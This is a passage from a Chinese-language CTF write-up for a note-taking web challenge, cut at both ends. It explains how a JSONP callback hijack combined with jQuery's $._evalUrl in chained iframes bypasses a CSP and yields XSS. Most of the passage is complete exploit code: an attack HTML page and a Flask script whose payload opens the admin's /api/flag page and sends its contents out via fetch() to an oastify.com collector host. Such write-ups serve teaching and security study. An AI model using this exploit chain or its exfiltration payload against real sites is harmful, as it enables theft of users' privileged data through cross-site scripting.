</code></pre></div><h3 class="x-h2">题目概览</h3><p class="x-p">题目是一个笔记应用，允许用户发送HTML笔记，笔记的内容通过<code class="x-inline-highlight">contentElement.html(note["noteContent"])</code>展示，最终需要XSS带外Admin Bot对<code class="x-inline-highlight">/api/flag</code>的请求。Admin Bot的cookie是httpOnly的。</p><p class="x-p">笔记展示页面<code class="x-inline-highlight">/note/...</code>有CSP限制，可利用的点几乎只有<code class="x-inline-highlight">script-src 'self'</code>；<code class="x-inline-highlight">index</code>页面则没有CSP。</p><p class="x-p">题目的后端是Express，前端引入了jQuery，并且对<code class="x-inline-highlight">/api/view/...</code>的请求会返回一个JSONP格式的响应，本题就是需要用jQuery和JSONP组合来实现XSS。（框架都是最新版，不是Nday利用的题目。）</p><p class="x-p">Admin Bot可以访问输入的任何URL，因此允许我们构造一个攻击页面并发送给Bot。</p><h3 class="x-h2">前期思路</h3><p class="x-p">首先，看到Express中处理JSONP的<a href="https://github.com/expressjs/express/blob/master/lib/response.js#L267-L311" target="_blank" rel="noreferrer" class="x-inline-link">源码</a>：<code class="x-inline-highlight">callback = callback.replace(/[^\[\]\w&#36;.]/g, '');</code>，这里只允许使用<code class="x-inline-highlight">A-Za-z0-9[].&#36;</code>这些字符，无法通过在<code class="x-inline-highlight">callback</code>中插入特殊字符进行注入。</p><p class="x-p"><code class="x-inline-highlight">notes.ejs</code>中使用JSONP的方式为<code class="x-inline-highlight">src="/api/view/&#60;%= note %&#62;?callback=showNote"</code>，可以通过访问<code class="x-inline-highlight">/note/anything%3fcallback=alert%23</code>来触发<code class="x-inline-highlight">alert</code>，原理是替换进模板后引入的<code class="x-inline-highlight">src</code>会变成<code class="x-inline-highlight">src="/api/view/anything?callback=alert#?callback=showNote"</code>。我们可以通过这个操作实现执行任意函数，比如：</p><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">alert</code></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">console.log</code></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">document.firstElementChild.nextElementSibling.click</code></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">document.forms[0].submit</code></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>...</p></div></div><p class="x-p">但可惜的是无法控制参数，当传入一个非法/不存在的<code class="x-inline-highlight">note_id</code>时，相当于对这个函数进行空参调用；当传入一个合法的<code class="x-inline-highlight">note_id</code>时，相当于有一个参数<code class="x-inline-highlight">notes.get(req.params.note)</code>，但这个参数仅当调用<code class="x-inline-highlight">showNote</code>时才有意义。（或者用<code class="x-inline-highlight">console.log</code>打印出来这个对象 ^v^）</p><h3 class="x-h2">Official Solution</h3><p class="x-p">官方解法的思路是构造一个攻击页面，通过<code class="x-inline-highlight">iframe</code>加载<code class="x-inline-highlight">index</code>页面（没有CSP），然后想办法在<code class="x-inline-highlight">index</code>页面中定义并执行<code class="x-inline-highlight">showNote</code>函数。官方解法需要一些条件/特性：</p><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>首先注意到<code class="x-inline-highlight">index.ejs</code>和<code class="x-inline-highlight">notes.ejs</code>中都有<code class="x-inline-highlight">id="noteContent"</code>的元素（一个是<code class="x-inline-highlight">input</code>，一个是<code class="x-inline-highlight">p</code>），这样保证了在<code class="x-inline-highlight">index</code>页面中执行<code class="x-inline-highlight">showNote</code>时仍然可以设置<code class="x-inline-highlight">#noteContent</code>元素的HTML内容；</p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>jQuery的<code class="x-inline-highlight">$.ajax(url)</code>在空参调用时，会默认使用<code class="x-inline-highlight">location.href</code>作为<code class="x-inline-highlight">url</code>；</p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p class="x-p">jQuery中有一个函数<code class="x-inline-highlight">$._evalUrl(url)</code>，可以解析执行<code class="x-inline-highlight">url</code>返回的JavaScript代码：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">JavaScript</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>jQuery<span class="token punctuation">.</span><span class="token function-variable function">_evalUrl</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> options<span class="token punctuation">,</span> doc</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> jQuery<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
        <span class="token literal-property property">url</span><span class="token operator">:</span> url<span class="token punctuation">,</span>

        <span class="token comment">// Make this explicit, since user can override this through ajaxSetup (trac-11264)</span>
        <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">"GET"</span><span class="token punctuation">,</span>
        <span class="token literal-property property">dataType</span><span class="token operator">:</span> <span class="token string">"script"</span><span class="token punctuation">,</span>
        <span class="token literal-property property">cache</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token literal-property property">async</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token literal-property property">global</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>

        <span class="token comment">// Only evaluate the response if it is successful (gh-4126)</span>
        <span class="token comment">// dataFilter is not invoked for failure responses, so using it instead</span>
        <span class="token comment">// of the default converter is kludgy but it works.</span>
        <span class="token literal-property property">converters</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string-property property">"text script"</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token function-variable function">dataFilter</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            jQuery<span class="token punctuation">.</span><span class="token function">globalEval</span><span class="token punctuation">(</span>response<span class="token punctuation">,</span> options<span class="token punctuation">,</span> doc<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre></div><p class="x-p">尽管我们不能控制<code class="x-inline-highlight">url</code>参数，注意到<code class="x-inline-highlight">jQuery._evalUrl</code>是使用<code class="x-inline-highlight">jQuery.ajax</code>的，因此空参调用时会解析并执行<code class="x-inline-highlight">location.href</code>，我们需要<code class="x-inline-highlight">location.href</code>指向一个返回JavaScript代码的URL。</p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p class="x-p"><code class="x-inline-highlight">server.js</code>中的路由：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">JavaScript</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token comment">/* index */</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"*path"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p class="x-p">会在其他路由均失配时默认返回<code class="x-inline-highlight">index</code>页面。</p></div></div><h4 class="x-h3">Step 1</h4><p class="x-p">首先，在攻击页面中创建这样一个<code class="x-inline-highlight">iframe</code>：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">HTML</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>
    &lt;form method='POST' action='{{target}}/view.js'>
    &lt;script>
        document.forms[0].submit();
    &lt;/script>
<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
</code></pre></div><p class="x-p">我使用Flask作为托管攻击页面的服务器，<code class="x-inline-highlight">target</code>在这里是这道题目的地址。这个<code class="x-inline-highlight">iframe</code>通过POST方法请求加载<code class="x-inline-highlight">/view.js</code>，这会导致定义的路由均失配，最终匹配到<code class="x-inline-highlight">*path</code>并返回<code class="x-inline-highlight">index</code>页面；并且这个页面的<code class="x-inline-highlight">location.href</code>会变成<code class="x-inline-highlight">/view.js</code>：</p><img alt="img" loading="lazy" width="545" height="216" decoding="async" data-nimg="1" class="x-image x-image-invert" style="color:transparent;height:auto" src="/_next/static/media/1.92f8a826.jpg"/><p class="x-p">（如果不用<code class="x-inline-highlight">srcdoc</code>而是<code class="x-inline-highlight">src=".../view.js"</code>，则会返回纯文本的JavaScript代码内容，这样就没有办法加载<code class="x-inline-highlight">index</code>页面了。）</p><h4 class="x-h3">Step 2</h4><p class="x-p">现在<code class="x-inline-highlight">index</code>页面中有我们需要的jQuery库和<code class="x-inline-highlight">#noteContent</code>元素，但是<code class="x-inline-highlight">showNote</code>函数是未定义的，而这个函数就是定义在<code class="x-inline-highlight">/view.js</code>中。因此我们上一步将第一个<code class="x-inline-highlight">iframe</code>的<code class="x-inline-highlight">location.href</code>操作成<code class="x-inline-highlight">/view.js</code>，就是为了这一步空参调用<code class="x-inline-highlight">$._evalUrl</code>做铺垫。空参调用时默认使用<code class="x-inline-highlight">location.href</code>做参数，也就会解析执行我们需要的<code class="x-inline-highlight">/view.js</code>了。</p><p class="x-p">现在在攻击页面中添加下面的代码：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">HTML</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
    <span class="token keyword">const</span> iframe2 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    iframe2<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"{{target}}/note/anything%3fcallback=top.frames[0].$._evalUrl%23"</span><span class="token punctuation">;</span>
    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe2<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
</code></pre></div><p class="x-p">利用前面提到的劫持<code class="x-inline-highlight">callback</code>的方法，通过引入第二个<code class="x-inline-highlight">iframe</code>，相当于执行了<code class="x-inline-highlight">top.frames[0].$._evalUrl()</code>。（注意传入的<code class="x-inline-highlight">note_id</code>是<code class="x-inline-highlight">"anything"</code>，后端并不会匹配到合法的<code class="x-inline-highlight">note</code>对象。）</p><p class="x-p">这个操作实际上是在第一个<code class="x-inline-highlight">iframe</code>中定义了<code class="x-inline-highlight">showNote</code>函数。</p><h4 class="x-h3">Step 3</h4><p class="x-p">回顾一下我们目前做了什么：我们的第一个<code class="x-inline-highlight">iframe</code>页面是与<code class="x-inline-highlight">target</code>同源的，也加载了jQuery库，并且也有<code class="x-inline-highlight">#noteContent</code>元素；我们通过引入第二个<code class="x-inline-highlight">iframe</code>触发JSONP，间接地在第一个<code class="x-inline-highlight">iframe</code>中完成了对<code class="x-inline-highlight">showNote</code>函数的定义。重要的是，第一个<code class="x-inline-highlight">iframe</code>页面中是没有CSP限制的，因此我们可以在这个页面中渲染恶意笔记，触发XSS。</p><p class="x-p">我们在Flask服务端代码中创建一个笔记，并把<code class="x-inline-highlight">note_id</code>保存下来，传给模板：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"&lt;img src=x onerror='alert(0)'>"</span>
resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">"/api/post"</span><span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"noteContent"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"noteTitle"</span><span class="token punctuation">:</span> <span class="token string">"anything"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
note_id <span class="token operator">=</span> resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span>
</code></pre></div><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">HTML</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
    <span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">ms</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">const</span> iframe2 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        iframe2<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"{{target}}/note/anything%3fcallback=top.frames[0].$._evalUrl%23"</span><span class="token punctuation">;</span>
        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe2<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">const</span> iframe3 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        iframe3<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"{{target}}/note/{{note_id}}%3fcallback=top.frames[0].showNote%23"</span><span class="token punctuation">;</span>
        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
</code></pre></div><p class="x-p">这次我们通过引入第三个<code class="x-inline-highlight">iframe</code>触发JSONP，间接地在第一个<code class="x-inline-highlight">iframe</code>中执行了<code class="x-inline-highlight">showNote</code>函数，渲染了包含<code class="x-inline-highlight">payload</code>的笔记内容，实现了XSS。为了保证正确的执行顺序，在加载每个<code class="x-inline-highlight">iframe</code>前加入了延时。</p><h4 class="x-h3">Step 4</h4><p class="x-p">正式利用时需要对<code class="x-inline-highlight">payload</code>稍作修改，引入带外逻辑；同时由于<code class="x-inline-highlight">cookie</code>是没有<code class="x-inline-highlight">SameSite=None</code>的，因此直接在<code class="x-inline-highlight">iframe</code>中访问<code class="x-inline-highlight">/api/flag</code>时是没有<code class="x-inline-highlight">cookie</code>的，需要通过<code class="x-inline-highlight">window.open</code>打开一个新窗口来访问。</p><h4 class="x-h3">完整代码</h4><p class="x-p">最终的攻击页面代码如下：</p><p class="x-p"><code class="x-inline-highlight">index.html</code>：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">HTML</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Exploit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>
    &lt;form method='POST' action='{{target}}/view.js'>
    &lt;script>
        document.forms[0].submit();
    &lt;/script>
<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
    <span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">ms</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">const</span> iframe2 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        iframe2<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"{{target}}/note/anything%3fcallback=top.frames[0].$._evalUrl%23"</span><span class="token punctuation">;</span>
        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe2<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">const</span> iframe3 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        iframe3<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"{{target}}/note/{{note_id}}%3fcallback=top.frames[0].showNote%23"</span><span class="token punctuation">;</span>
        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
</code></pre></div><p class="x-p"><code class="x-inline-highlight">exp.py</code>：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template
<span class="token keyword">import</span> requests

target <span class="token operator">=</span> <span class="token string">"https://jnotes-web.chal.idek.team"</span>

payload <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;img src=x onerror='
    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
    const tab = window.open(`/api/flag`);
    sleep(3000).then(() => fetch("//ta7dkoi5sodij8u1k6eft29ybphg56tv.oastify.com/?flag=" + tab.document.body.innerText));
'>"""</span>

resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">"/api/post"</span><span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"noteContent"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"noteTitle"</span><span class="token punctuation">:</span> <span class="token string">"anything"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
note_id <span class="token operator">=</span> resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>note_id<span class="token punctuation">)</span>

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">,</span> template_folder<span class="token operator">=</span><span class="token string">"."</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span> target<span class="token operator">=</span>target<span class="token punctuation">,</span> note_id<span class="token operator">=</span>note_id<span class="token punctuation">)</span>


app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> <span class="token number">5003</span><span class="token punctuation">)</span>
</code></pre></div><img alt="img" loading="lazy" width="742" height="326" decoding="async" data-nimg="1" class="x-image x-image-invert" style="color:transparent;height:auto" src="/_next/static/media/2.2ae068ea.jpg"/><h3 class="x-h2">Community Solution</h3><p class="x-p">首先除了通过<code class="x-inline-highlight">/note/anything%3fcallback=alert%23</code>来触发<code class="x-inline-highlight">alert</code>，还有一种方法是设置笔记的内容为：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">HTML</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token tag"><span class="token tag"><span class="token 